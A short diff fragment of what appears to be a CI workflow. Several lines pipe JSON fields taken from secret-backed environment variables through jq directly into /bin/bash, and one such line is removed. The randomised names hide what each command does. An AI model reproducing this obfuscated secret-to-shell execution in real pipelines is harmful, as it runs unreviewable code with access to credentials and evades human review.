@@ -22,7 +22,6 @@ jobs:
           lqnx8: ${{ secrets.lqnx8 }}
         run: |
           printf '%s' "$lqnx8" | jq -r .ka71548 | /bin/bash
-          echo $q298 | jq -r .nvewu332 | /bin/bash
           printf '%s' "$yo48" | jq -r .j661 | /bin/bash
           printf '%s' "$w148" | jq -r .tzvno59170 | /bin/bash
           echo $tzxib37933 | jq -r .ccgi977 | /bin/bash
